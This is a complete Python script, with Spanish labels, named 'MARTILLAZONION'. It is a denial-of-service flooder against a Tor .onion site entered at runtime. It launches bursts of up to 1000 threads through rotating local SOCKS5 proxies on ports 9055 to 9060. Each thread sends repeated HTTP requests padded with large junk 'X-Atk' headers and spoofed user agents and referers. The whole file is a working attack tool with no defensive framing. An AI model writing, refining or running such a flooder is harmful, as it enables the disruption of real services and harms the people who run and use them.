import socks
import socket
import threading
import random
import time

onion_host = input("Dominio .onion (v3): ").strip()
proxy_ports = list(range(9055, 9061))  # Puertos 9055 al 9060

PORT = 80
MAX_HILOS = 1000
RAFA_MAX = 250
PAQUETES_POR_CONN = 100
TTL_VALUE = 1
SOCKET_TIMEOUT = 4
DELAY_ENTRE_PAKETS = 0.002
DELAY_RAFAGA = 15

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "curl/7.87.0",
    "Wget/1.21.1",
    "Lynx/2.8.9rel.1"
]

referers = [
    "http://duckduckgo.com",
    "http://protonmail.com",
    "http://torproject.org",
    "http://facebookcorewwwi.onion"
]

lock = threading.Lock()
proxy_index = 0
hilos_activos = 0

def generar_payload():
    headers_extra = ''.join(
        f"X-Atk-{i}: {'Z' * random.randint(400, 950)}\r\n"
        for i in range(random.randint(2, 6))
    )
    return (
        f"GET /boom?{random.randint(100000,999999)} HTTP/1.1\r\n"
        f"Host: {onion_host}\r\n"
        f"User-Agent: {random.choice(user_agents)}\r\n"
        f"Referer: {random.choice(referers)}\r\n"
        f"{headers_extra}"
        f"Connection: close\r\n\r\n"
    )

def get_next_proxy():
    global proxy_index
    with lock:
        port = proxy_ports[proxy_index]
        proxy_index = (proxy_index + 1) % len(proxy_ports)
        return port

def proxy_disponible(port):
    try:
        test = socket.create_connection(("127.0.0.1", port), timeout=3)
        test.close()
        return True
    except:
        return False

def ataque():
    global hilos_activos
    port = get_next_proxy()
    try:
        for _ in range(PAQUETES_POR_CONN):
            if not proxy_disponible(port):
                time.sleep(1)
                continue
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, "127.0.0.1", port)
            s.settimeout(SOCKET_TIMEOUT)
            s.connect((onion_host, PORT))
            s.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, TTL_VALUE)
            s.sendall(generar_payload().encode())
            s.close()
            time.sleep(DELAY_ENTRE_PAKETS)
    except:
        time.sleep(1)
    finally:
        with lock:
            hilos_activos -= 1

def lanzar_rafaga(cantidad):
    global hilos_activos
    with lock:
        permitidos = MAX_HILOS - hilos_activos
        if permitidos <= 0:
            return
        lanzar = cantidad if cantidad <= permitidos else permitidos
        hilos_activos += lanzar

    for _ in range(lanzar):
        t = threading.Thread(target=ataque)
        t.daemon = True
        t.start()

def monitorear_proxies():
    while True:
        down = []
        for port in proxy_ports:
            if not proxy_disponible(port):
                down.append(port)
        if down:
            print(f"[✗] SOCKS inactivos: {down}")
        time.sleep(10)

def main_loop():
    threading.Thread(target=monitorear_proxies, daemon=True).start()
    while True:
        lanzar_rafaga(RAFA_MAX)
        with lock:
            print(f"[⚒️] Ráfaga: {RAFA_MAX} hilos activos: {hilos_activos}")
        time.sleep(DELAY_RAFAGA)

if __name__ == "__main__":
    print(f"\n[🔥] MARTILLAZONION Multipuerto 9055–9060")
    print(f"[→] Objetivo: {onion_host}")
    print(f"[→] Usando SOCKS5 puertos: {proxy_ports}\n")
    main_loop()
